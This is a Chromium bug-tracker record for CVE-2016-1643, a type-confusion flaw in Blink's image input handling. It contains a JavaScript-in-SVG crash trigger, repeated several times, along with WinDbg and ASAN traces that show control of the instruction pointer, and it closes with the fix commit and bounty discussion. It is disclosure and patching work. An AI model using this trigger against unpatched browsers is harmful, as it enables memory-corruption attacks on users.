# Security: type confusion in blink::BaseButtonInputType::valueAttributeChanged

| Field | Value |
|-------|-------|
| **Issue ID** | [40083758](https://issues.chromium.org/issues/40083758) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Platforms** | Windows |
| **CVE IDs** | CVE-2016-1643 |
| **Reporter** | cl...@gmail.com |
| **Assignee** | tk...@chromium.org |
| **Created** | 2016-02-25 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

The attached testcase (crash.svg) triggers a type confusion in blink::BaseButtonInputType::valueAttributeChanged which can be exploited to get fairly reliable control of EIP on the 32-bit version of Chrome on Windows 10. A PoC is attached as poc.html (+crash.svg) which triggers the following crash on Windows if successful (which it is in most cases for me):

The PoC was loaded from a local web server.

Chrome on Windows 10: Version 48.0.2564.116 m

Stack:  

chrome\_child!blink::ContainerNode::attachChildren+0x3a  

chrome\_child!blink::ContainerNode::attach+0x8  

chrome\_child!blink::Element::attach+0x126  

chrome\_child!blink::HTMLFormControlElement::attach+0xa  

chrome\_child!blink::HTMLInputElement::attach+0x15  

chrome\_child!blink::Node::reattach+0x31  

chrome\_child!blink::Element::recalcOwnStyle+0xf0  

chrome\_child!blink::Element::recalcStyle+0x8f  

chrome\_child!blink::ContainerNode::recalcChildStyle+0xc6  

chrome\_child!blink::Element::recalcStyle+0x170  

chrome\_child!blink::Document::updateStyle+0x256  

chrome\_child!blink::Document::updateLayoutTree+0x1fa  

chrome\_child!blink::Document::updateLayoutTreeIfNeeded+0x7  

chrome\_child!blink::FrameView::updateStyleAndLayoutIfNeededRecursive+0x55  

chrome\_child!blink::FrameView::updateStyleAndLayoutIfNeededRecursive+0x107  

chrome\_child!blink::FrameView::updateLifecyclePhasesInternal+0x19  

chrome\_child!blink::FrameView::updateLifecycleToCompositingCleanPlusScrolling+0x15  

chrome\_child!blink::PageAnimator::updateLifecycleToCompositingCleanPlusScrolling+0x38  

chrome\_child!blink::PageWidgetDelegate::updateLifecycleToCompositingCleanPlusScrolling+0x11  

chrome\_child!blink::WebViewImpl::updateAllLifecyclePhases+0x7b

Windbg:  

(1170.23d8): Access violation - code c0000005 (first chance)  

First chance exceptions are reported before any exception handling.  

This exception may be expected and handled.  

chrome\_child!blink::ContainerNode::attachChildren+0x3a:  

5dd058e9 ff90c4000000 call dword ptr [eax+0C4h] ds:002b:beefbeef=????????  

0:000:x86> dd 0x24242424  

24242424 dead0000 dead0001 dead0002 dead0003  

24242434 dead0004 dead0005 dead0006 dead0007  

24242444 24242454 dead0009 dead000a dead000b  

24242454 beefbe2b dead000d dead000e dead000f  

24242464 00180000 00000000 00000000 00000000  

24242474 00000000 00000000 00000000 00000000  

24242484 00000000 00000000 00000000 00000000  

24242494 00000000 00000000 00000000 00000000  

0:000:x86> r  

eax=beefbe2b ebx=0018eba8 ecx=24242454 edx=0018eba8 esi=24242454 edi=00000000  

eip=5dd058e9 esp=0018eb44 ebp=0018eb5c iopl=0 nv up ei pl zr na pe nc  

cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010246  

chrome\_child!blink::ContainerNode::attachChildren+0x3a:  

5dd058e9 ff90c4000000 call dword ptr [eax+0C4h] ds:002b:beefbeef=????????

Assembly:  

5dd058d2 8b4610 mov eax,dword ptr [esi+10h]  

5dd058d5 2500001800 and eax,180000h  

5dd058da 3d00001800 cmp eax,180000h  

5dd058df 750e jne chrome\_child!blink::ContainerNode::attachChildren+0x40 (5dd058ef)  

5dd058e1 8b06 mov eax,dword ptr [esi]  

5dd058e3 8d4df4 lea ecx,[ebp-0Ch]  

5dd058e6 51 push ecx  

5dd058e7 8bce mov ecx,esi  

5dd058e9 ff90c4000000 call dword ptr [eax+0C4h] ds:002b:beefbeef=????????

The latest ASAN build of chromium crashes on an ASSERT\_WITH\_SECURITY\_IMPLICATION as follows:

# ASSERTION FAILED: !node || (node->isTextNode()) ../../third\_party/WebKit/Source/core/dom/Text.h(86) : blink::Text \*blink::toText(blink::Node \*) [18239:18239:0225/151528:10605916812:INFO:CONSOLE(24)] "3", source: file:///home/nils/MonkeyChrome/OpRealEstate/submission10/crash.svg (24) 1 0x8bbfa67 2 0x8bfcbb7 3 0x8649bd2 4 0x7d47291 5 0x7d6deee 6 0x7d2e7c0 7 0x8bbfdf9 8 0x865522f 9 0x8654b18 10 0xba7cd94 11 0x53e0887 12 0x3eb3f87 13 0x3eb23b0 14 0x4a54d5c 15 0x4ab9726 16 0x4ab8a00 17 0x490ae6b 18 0x491c739 19 0x7f49303099bb ASAN:DEADLYSIGNAL

==18266==ERROR: AddressSanitizer: SEGV on unknown address 0x00009f7537dd (pc 0x000008bbfa67 bp 0x7ffe429d0710 sp 0x7ffe429d06a0 T0)  

#0 0x8bbfa66 in toText third\_party/WebKit/Source/core/dom/Text.h:86:1  

#1 0x8bbfa66 in blink::BaseButtonInputType::valueAttributeChanged() third\_party/WebKit/Source/core/html/forms/BaseButtonInputType.cpp:53  

#2 0x8bfcbb6 in blink::ImageInputType::valueAttributeChanged() third\_party/WebKit/Source/core/html/forms/ImageInputType.cpp:152:5  

#3 0x8649bd1 in blink::HTMLInputElement::parseAttribute(blink::QualifiedName const&, WTF::AtomicString const&, WTF::AtomicString const&) third\_party/WebKit/Source/core/html/HTMLInputElement.cpp:710:9  

#4 0x7d47290 in blink::Element::attributeChanged(blink::QualifiedName const&, WTF::AtomicString const&, WTF::AtomicString const&, blink::Element::AttributeModificationReason) third\_party/WebKit/Source/core/dom/Element.cpp:1156:5  

#5 0x7d6deed in blink::Element::didAddAttribute(blink::QualifiedName const&, WTF::AtomicString const&) third\_party/WebKit/Source/core/dom/Element.cpp:3118:5  

#6 0x7d2e7bf in appendAttributeInternal third\_party/WebKit/Source/core/dom/Element.cpp:2256:9  

#7 0x7d2e7bf in setAttributeInternal third\_party/WebKit/Source/core/dom/Element.cpp:1124  

#8 0x7d2e7bf in blink::Element::setAttribute(blink::QualifiedName const&, WTF::AtomicString const&) third\_party/WebKit/Source/core/dom/Element.cpp:1106  

#9 0x8bbfdf8 in blink::BaseButtonInputType::setValue(WTF::String const&, bool, blink::TextFieldEventBehavior) third\_party/WebKit/Source/core/html/forms/BaseButtonInputType.cpp:82:5  

#10 0x865522e in blink::HTMLInputElement::setValue(WTF::String const&, blink::TextFieldEventBehavior) third\_party/WebKit/Source/core/html/HTMLInputElement.cpp:1084:5  

#11 0x8654b17 in blink::HTMLInputElement::setValue(WTF::String const&, blink::ExceptionState&, blink::TextFieldEventBehavior) third\_party/WebKit/Source/core/html/HTMLInputElement.cpp:1066:5  

#12 0xba7cd93 in valueAttributeSetter /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLInputElement.cpp:1057:5  

#13 0xba7cd93 in blink::HTMLInputElementV8Internal::valueAttributeSetterCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLInputElement.cpp:1065  

#14 0x53e0886 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/arguments.cc:33:3  

#15 0x3eb3f86 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>) v8/src/builtins.cc:3803:34  

#16 0x3eb23af in v8::internal::Builtins::InvokeApiFunction(v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/builtins.cc:3952:14  

#17 0x4a54d5b in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Object::ShouldThrow) v8/src/objects.cc:1252:9  

#18 0x4ab9725 in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed, bool\*) v8/src/objects.cc:4153:16  

#19 0x4ab89ff in v8::internal::Object::SetProperty(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed) v8/src/objects.cc:4202:7  

#20 0x490ae6a in v8::internal::StoreIC::Store(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Object::StoreFromKeyed) v8/src/ic/ic.cc:1559:3  

#21 0x491c738 in \_\_RT\_impl\_Runtime\_StoreIC\_Miss v8/src/ic/ic.cc:2321:5  

#22 0x491c738 in v8::internal::Runtime\_StoreIC\_Miss(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/ic/ic.cc:2305  

#23 0x7f49303099ba (<unknown module>)  

#24 0x7f4930341426 (<unknown module>)  

#25 0x7f4930311b76 (<unknown module>)  

#26 0x7f4930338043 (<unknown module>)  

#27 0x7f49303194c1 (<unknown module>)  

#28 0x462f060 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:97:13  

#29 0x462d991 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:163:10  

#30 0x3d80e00 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api.cc:4388:7  

#31 0xb3cb4e0 in blink::V8ScriptRunner::callFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:465:40  

#32 0xc0e2bde in blink::V8EventListener::callListenerFunction(blink::ScriptState\*, v8::Local[v8::Value](javascript:void(0);), blink::Event\*) third\_party/WebKit/Source/bindings/core/v8/V8EventListener.cpp:94:10  

#33 0xb344cf7 in blink::V8AbstractEventListener::invokeEventHandler(blink::ScriptState\*, blink::Event\*, v8::Local[v8::Value](javascript:void(0);)) third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:138:23  

#34 0xb344784 in blink::V8AbstractEventListener::handleEvent(blink::ScriptState\*, blink::Event\*) third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:99:5  

#35 0xb344347 in blink::V8AbstractEventListener::handleEvent(blink::ExecutionContext\*, blink::Event\*) third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:84:5  

#36 0x80a1879 in blink::EventTarget::fireEventListeners(blink::Event\*, blink::EventTargetData\*, blink::HeapVector<blink::RegisteredEventListener, 1ul>&) third\_party/WebKit/Source/core/events/EventTarget.cpp:444:9  

#37 0x809f28b in blink::EventTarget::fireEventListeners(blink::Event\*) third\_party/WebKit/Source/core/events/EventTarget.cpp:368:9  

#38 0x7e701c1 in blink::Node::handleLocalEvents(blink::Event&) third\_party/WebKit/Source/core/dom/Node.cpp:2030:5  

#39 0x80bfe9a in blink::NodeEventContext::handleLocalEvents(blink::Event&) const third\_party/WebKit/Source/core/events/NodeEventContext.cpp:66:5  

#40 0x806b994 in dispatchEventAtTarget third\_party/WebKit/Source/core/events/EventDispatcher.cpp:170:5  

#41 0x806b994 in blink::EventDispatcher::dispatch() third\_party/WebKit/Source/core/events/EventDispatcher.cpp:125  

#42 0x8069489 in blink::EventDispatcher::dispatchEvent(blink::Node&, WTF::RawPtr[blink::EventDispatchMediator](javascript:void(0);)) third\_party/WebKit/Source/core/events/EventDispatcher.cpp:49:12  

#43 0x80c13c7 in dispatchEvent third\_party/WebKit/Source/core/events/ScopedEventQueue.cpp:82:5  

#44 0x80c13c7 in blink::ScopedEventQueue::enqueueEventDispatchMediator(WTF::RawPtr[blink::EventDispatchMediator](javascript:void(0);)) third\_party/WebKit/Source/core/events/ScopedEventQueue.cpp:66  

#45 0x8069908 in blink::EventDispatcher::dispatchScopedEvent(blink::Node&, WTF::RawPtr[blink::EventDispatchMediator](javascript:void(0);)) third\_party/WebKit/Source/core/events/EventDispatcher.cpp:68:5  

#46 0x7e7039f in blink::Node::dispatchScopedEvent(WTF::RawPtr[blink::Event](javascript:void(0);)) third\_party/WebKit/Source/core/dom/Node.cpp:2036:5  

#47 0x85fab0b in dispatchLoad third\_party/WebKit/Source/core/html/HTMLFrameOwnerElement.cpp:218:5  

#48 0x85fab0b in non-virtual thunk to blink::HTMLFrameOwnerElement::dispatchLoad() third\_party/WebKit/Source/core/html/HTMLFrameOwnerElement.cpp:216  

#49 0x96de23f in blink::LocalDOMWindow::dispatchLoadEvent() third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1374:9  

#50 0x96dda3c in blink::LocalDOMWindow::dispatchWindowLoadEvent() third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:404:5  

#51 0x96df0cc in blink::LocalDOMWindow::documentWasClosed() third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:409:5  

#52 0x7c798ac in blink::Document::implicitClose() third\_party/WebKit/Source/core/dom/Document.cpp:2681:9  

#53 0x9c775ac in blink::FrameLoader::checkCompleted() third\_party/WebKit/Source/core/loader/FrameLoader.cpp:577:9  

#54 0x9c770ce in blink::FrameLoader::finishedParsing() third\_party/WebKit/Source/core/loader/FrameLoader.cpp:494:5  

#55 0x7cbdc2a in blink::Document::finishedParsing() third\_party/WebKit/Source/core/dom/Document.cpp:4773:9  

#56 0x8a8bf8a in blink::HTMLTreeBuilder::finished() third\_party/WebKit/Source/core/html/parser/HTMLTreeBuilder.cpp:2814:5  

#57 0x892d35b in end third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:897:5  

#58 0x892d35b in attemptToRunDeferredScriptsAndEnd third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:910  

#59 0x892d35b in blink::HTMLDocumentParser::prepareToStopParsing() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:284  

#60 0x8936f9c in blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr[blink::HTMLDocumentParser::ParsedChunk](javascript:void(0);)) third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:533:13  

#61 0x892fdc7 in blink::HTMLDocumentParser::pumpPendingSpeculations() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:586:36  

#62 0x896d79b in operator() third\_party/WebKit/Source/wtf/Functional.h:101:16  

#63 0x896d79b in callInternal<0> third\_party/WebKit/Source/wtf/Functional.h:176  

#64 0x896d79b in WTF::PartBoundFunctionImpl<std::\_\_1::tuple<blink::CrossThreadWeakPersistentThisPointer[blink::HTMLParserScheduler](javascript:void(0);) >, WTF::FunctionWrapper<void (blink::HTMLParserScheduler::\*)()>>::operator()() third\_party/WebKit/Source/wtf/Functional.h:168  

#65 0x11e90584 in blink::CancellableTaskFactory::CancellableTask::run() third\_party/WebKit/Source/platform/scheduler/CancellableTaskFactory.cpp:27:9  

#66 0xdecd300 in Run base/bind\_internal.h:158:12  

#67 0xdecd300 in MakeItSo base/bind\_internal.h:298  

#68 0xdecd300 in base::internal::Invoker<base::IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >)>, void (scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >), base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >)>, base::internal::TypeList<scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:348  

#69 0x893579 in Run base/callback.h:394:12  

#70 0x893579 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#71 0xded6bed in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(scheduler::internal::WorkQueue\*, scheduler::internal::TaskQueueImpl::Task\*) components/scheduler/base/task\_queue\_manager.cc:288:3  

#72 0xded1b03 in scheduler::TaskQueueManager::DoWork(base::TimeTicks, bool) components/scheduler/base/task\_queue\_manager.cc:200:13  

#73 0xded9a1b in Run base/bind\_internal.h:179:12  

#74 0xded9a1b in MakeItSo base/bind\_internal.h:308  

#75 0xded9a1b in base::internal::Invoker<base::IndexSequence<0ul, 1ul, 2ul>, base::internal::BindState<base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(base::TimeTicks, bool)>, void (scheduler::TaskQueueManager\*, base::TimeTicks, bool), base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), base::TimeTicks, bool>, base::internal::TypeList<base::internal::UnwrapTraits<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) >, base::internal::UnwrapTraits[base::TimeTicks](javascript:void(0);), base::internal::UnwrapTraits<bool> >, base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(base::TimeTicks, bool)>, base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) const&, base::TimeTicks const&, bool const&> >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:348  

#76 0x893579 in Run base/callback.h:394:12  

#77 0x893579 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#78 0x7008a7 in base::MessageLoop::RunTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:486:3  

#79 0x7025a5 in DeferOrRunPendingTask base/message\_loop/message\_loop.cc:495:5  

#80 0x7025a5 in base::MessageLoop::DoWork() base/message\_loop/message\_loop.cc:607  

#81 0x7108ae in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:33:21  

#82 0x75b15b in base::RunLoop::Run() base/run\_loop.cc:56:3  

#83 0x6fda18 in base::MessageLoop::Run() base/message\_loop/message\_loop.cc:293:3  

#84 0xe0ab53b in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:226:7  

#85 0x6559af in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:304:14  

#86 0x657db3 in content::RunNamedProcessTypeMain(std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:391:12  

#87 0x65a9aa in content::ContentMainRunnerImpl::Run() content/app/content\_main\_runner.cc:752:12  

#88 0x65447b in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:15  

#89 0x50059f in main content/shell/app/shell\_main.cc:48:10  

#90 0x7f4aeb2b7a3f in \_\_libc\_start\_main /build/glibc-ryFjv0/glibc-2.21/csu/libc-start.c:289

AddressSanitizer can not provide additional info.  

SUMMARY: AddressSanitizer: SEGV third\_party/WebKit/Source/core/dom/Text.h:86:1 in toText  

==18266==ABORTING

**VERSION**  

Chrome Version: Current stable + latest ASAN build  

Operating System: tested on Linux and Windows, PoC tested on Windows 10

**REPRODUCTION CASE**

crash.svg:

<svg width="100%" height="100%" viewBox="0 0 100 100"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">

 <script type="text/javascript">
// <![CDATA[
function start(o) {
try{ while(document.removeChild(document.firstChild)); } catch(e){}
o398=document.implementation.createHTMLDocument();
document.appendChild(o398.documentElement);
o433=document.createElementNS('http://www.w3.org/1999/xhtml','input');
o433.type='image';
o466=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o466.srcdoc=unescape();
o466.addEventListener('load', load,false);
document.documentElement.appendChild(o433);
window.setTimeout(bar, 40);
}
function bar() {
document.documentElement.appendChild(o466);
o433.setAttribute('src','#id37');
}
function load() {
o433.value='$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$';
location.reload();
}
start();
// ]]>
</script>
</svg>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Attachments

- [crash.svg](attachments/crash.svg) (image/svg+xml, 917 B)
- [poc.html](attachments/poc.html) (text/plain, 609 B)

## Timeline

### cl...@chromium.org (2016-02-25)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6135003055915008

Uploader: ochang@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: ASSERT
Crash Address: 
Crash State:
  ASSERTION FAILED: !node || (node->isTextNode())
  blink::BaseButtonInputType::valueAttributeChanged
  blink::ImageInputType::valueAttributeChanged
  

Minimized Testcase (0.87 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94dIt_xBHOvzNDIoq60EFRCikAd127QHc7VaT8R3QBiUh2oinHXx-tyGbaeyC1h_1xdFsVpXDv5ysJp5V2RvscD3HnQAa86_5-Iuaw_zPZurqUkYd0BEHWUixfkXxpTWWg8U_96o3ysEJd6CBE5Ef8dEz_uDw
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">
    // <![CDATA[
function start(o) {
	try{ while(document.removeChild(document.firstChild)); } catch(e){}
	o398=document.implementation.createHTMLDocument();
	document.appendChild(o398.documentElement);
	o433=document.createElementNS('http://www.w3.org/1999/xhtml','input');
	o433.type='image';
	o466=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
	o466.srcdoc=unescape();
	o466.addEventListener('load', load,false);
	document.documentElement.appendChild(o433);
	window.setTimeout(bar, 40);
}
function bar() {
	document.documentElement.appendChild(o466);
	o433.setAttribute('src','#id37');
}
function load() {
	o433.value='$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$';
}
start();
   // ]]>
  </script>
</svg>


Filer: ochang

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### oc...@chromium.org (2016-02-25)

Thanks for the report.

tkent, could you please take a look or help find an owner? thanks!

[Monorail components: Blink>Forms>Input]

### cl...@chromium.org (2016-02-25)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6135003055915008

Uploader: ochang@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: ASSERT
Crash Address: 
Crash State:
  ASSERTION FAILED: !node || (node->isTextNode())
  blink::BaseButtonInputType::valueAttributeChanged
  blink::ImageInputType::valueAttributeChanged
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=307479:307632

Minimized Testcase (0.87 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94dIt_xBHOvzNDIoq60EFRCikAd127QHc7VaT8R3QBiUh2oinHXx-tyGbaeyC1h_1xdFsVpXDv5ysJp5V2RvscD3HnQAa86_5-Iuaw_zPZurqUkYd0BEHWUixfkXxpTWWg8U_96o3ysEJd6CBE5Ef8dEz_uDw
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">
    // <![CDATA[
function start(o) {
	try{ while(document.removeChild(document.firstChild)); } catch(e){}
	o398=document.implementation.createHTMLDocument();
	document.appendChild(o398.documentElement);
	o433=document.createElementNS('http://www.w3.org/1999/xhtml','input');
	o433.type='image';
	o466=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
	o466.srcdoc=unescape();
	o466.addEventListener('load', load,false);
	document.documentElement.appendChild(o433);
	window.setTimeout(bar, 40);
}
function bar() {
	document.documentElement.appendChild(o466);
	o433.setAttribute('src','#id37');
}
function load() {
	o433.value='$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$';
}
start();
   // ]]>
  </script>
</svg>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### tk...@chromium.org (2016-02-26)

Looks a regression by https://chromium.googlesource.com/chromium/src/+/1717cf4bfefc8504ff6971d2e8fab1e14ea462bb robhogan@gmail.com

### tk...@chromium.org (2016-02-26)

Smaller repro:

<input type=image id=o433>
<script>
document.body.onload = function() {
    o433.onload = function() {
        o433.value = '$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$';
    };
    o433.setAttribute('src','http://www.google.com/images/logo.png');
};
</script>


### tk...@chromium.org (2016-02-26)

[Empty comment from Monorail migration]

### tk...@chromium.org (2016-02-26)

I'll ask Keishi to review the fix.


### bu...@chromium.org (2016-02-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2386a6a49ea992a1e859eb0296c1cc53e5772cdb

commit 2386a6a49ea992a1e859eb0296c1cc53e5772cdb
Author: tkent <tkent@chromium.org>
Date: Fri Feb 26 04:04:27 2016

ImageInputType::ensurePrimaryContent should recreate UA shadow tree.

Once the fallback shadow tree was created, it was never recreated even if
ensurePrimaryContent was called.  Such situation happens by updating |src|
attribute.

BUG=589838

Review URL: https://codereview.chromium.org/1732753004

Cr-Commit-Position: refs/heads/master@{#377804}

[modify] https://crrev.com/2386a6a49ea992a1e859eb0296c1cc53e5772cdb/third_party/WebKit/Source/core/html/HTMLInputElementTest.cpp
[modify] https://crrev.com/2386a6a49ea992a1e859eb0296c1cc53e5772cdb/third_party/WebKit/Source/core/html/forms/ImageInputType.cpp


### tk...@chromium.org (2016-02-26)

[Empty comment from Monorail migration]

### ro...@gmail.com (2016-02-26)

@tkent - thanks!

### cl...@chromium.org (2016-02-27)

ClusterFuzz has detected this issue as fixed in range 377688:377898.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6135003055915008

Uploader: ochang@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: ASSERT
Crash Address: 
Crash State:
  ASSERTION FAILED: !node || (node->isTextNode())
  blink::BaseButtonInputType::valueAttributeChanged
  blink::ImageInputType::valueAttributeChanged
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=307479:307632
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=377688:377898

Minimized Testcase (0.87 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94dIt_xBHOvzNDIoq60EFRCikAd127QHc7VaT8R3QBiUh2oinHXx-tyGbaeyC1h_1xdFsVpXDv5ysJp5V2RvscD3HnQAa86_5-Iuaw_zPZurqUkYd0BEHWUixfkXxpTWWg8U_96o3ysEJd6CBE5Ef8dEz_uDw
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">
    // <![CDATA[
function start(o) {
	try{ while(document.removeChild(document.firstChild)); } catch(e){}
	o398=document.implementation.createHTMLDocument();
	document.appendChild(o398.documentElement);
	o433=document.createElementNS('http://www.w3.org/1999/xhtml','input');
	o433.type='image';
	o466=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
	o466.srcdoc=unescape();
	o466.addEventListener('load', load,false);
	document.documentElement.appendChild(o433);
	window.setTimeout(bar, 40);
}
function bar() {
	document.documentElement.appendChild(o466);
	o433.setAttribute('src','#id37');
}
function load() {
	o433.value='$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$';
}
start();
   // ]]>
  </script>
</svg>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### tk...@chromium.org (2016-02-29)

[Empty comment from Monorail migration]

### ti...@google.com (2016-02-29)

[Automated comment] Less than 2 weeks to go before stable on M49, manual review required.

### ti...@google.com (2016-02-29)

bump Tina - can you please review for M-49?

### ti...@google.com (2016-02-29)

[Empty comment from Monorail migration]

### ti...@google.com (2016-02-29)

s/Tina/Shruthi/g - sorry! (again!)

### ti...@google.com (2016-03-02)

Congrats - $5000 for this report.

This didn't make the M49 initial release cut but I'll tag it for a patch release of M49.

### ss...@google.com (2016-03-02)

[Empty comment from Monorail migration]

### ss...@google.com (2016-03-02)

Merge approved for M49 (branch 2623)

### go...@chromium.org (2016-03-03)

Please merge your change to M49 branch 2623 asap. We're planning M49 stable candidate cut for next week release on this Friday @ 5:00 PM PST.

### bu...@chromium.org (2016-03-03)

The following revision refers to this bug:
